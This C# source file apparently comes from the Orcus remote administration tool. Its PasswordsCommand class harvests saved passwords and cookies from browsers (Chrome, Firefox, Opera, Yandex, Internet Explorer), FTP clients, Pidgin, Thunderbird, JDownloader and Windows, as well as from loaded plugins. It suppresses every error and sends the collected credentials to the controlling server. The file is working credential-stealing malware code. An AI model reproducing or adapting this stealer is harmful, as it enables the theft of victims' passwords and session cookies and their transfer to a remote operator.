using System;
using System.Collections.Generic;
using System.Linq;
using Orcus.CommandManagement;
using Orcus.Commands.Passwords.Applications.Chrome;
using Orcus.Commands.Passwords.Applications.CoreFTP;
using Orcus.Commands.Passwords.Applications.FileZilla;
using Orcus.Commands.Passwords.Applications.InternetExplorer;
using Orcus.Commands.Passwords.Applications.JDownloader;
using Orcus.Commands.Passwords.Applications.Mozilla;
using Orcus.Commands.Passwords.Applications.Opera;
using Orcus.Commands.Passwords.Applications.Pidgin;
using Orcus.Commands.Passwords.Applications.Windows;
using Orcus.Commands.Passwords.Applications.WinSCP;
using Orcus.Commands.Passwords.Applications.Yandex;
using Orcus.Plugins;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Connection;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.Passwords
{
    internal class PasswordsCommand : Command
    {
        public override void Dispose()
        {
        }

        public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
        {
            var passwords = GetPasswords(true);
            var data = new Serializer(typeof (PasswordData)).Serialize(passwords);
            ((ConnectionInfo) connectionInfo).SendServerPackage(ServerPackageType.AddPasswords, data, true);
        }

        public static PasswordData GetPasswords(bool recoverCookies)
        {
            var passwordRecoveryPrograms = new IPasswordRecovery[]
            {
                new Chrome(), new CoreFtp(), new FileZilla(), new InternetExplorer(), new Opera(), new WinSCP(),
                new Yandex(), new Pidgin(), new Firefox(), new JDownloader(), new Thunderbird(), new Windows()
            };

            var result = new PasswordData
            {
                Cookies = new List<RecoveredCookie>(),
                Passwords = new List<RecoveredPassword>()
            };

            foreach (var passwordRecoveryProgram in passwordRecoveryPrograms)
            {
                try
                {
                    result.Passwords.AddRange(passwordRecoveryProgram.GetPasswords());
                }
                catch (Exception)
                {
                    // ignored
                }
            }

            foreach (var clientController in PluginLoader.Current.ClientPlugins)
            {
                try
                {
                    var passwords = clientController.RecoverPasswords();
                    if (passwords != null && passwords.Count > 0)
                        result.Passwords.AddRange(passwords);
                }
                catch (Exception)
                {
                    // ignored
                }
            }

            if (recoverCookies)
            {
                foreach (var passwordRecoveryProgram in passwordRecoveryPrograms.OfType<ICookieRecovery>())
                {
                    try
                    {
                        result.Cookies.AddRange(passwordRecoveryProgram.GetCookies());
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }

                foreach (var clientController in PluginLoader.Current.ClientPlugins)
                {
                    try
                    {
                        var cookies = clientController.RecoverCookies();
                        if (cookies != null && cookies.Count > 0)
                            result.Cookies.AddRange(cookies);
                    }
                    catch (Exception)
                    {
                        // ignored
                    }
                }
            }

            return result;
        }

        protected override uint GetId()
        {
            return 12;
        }
    }
}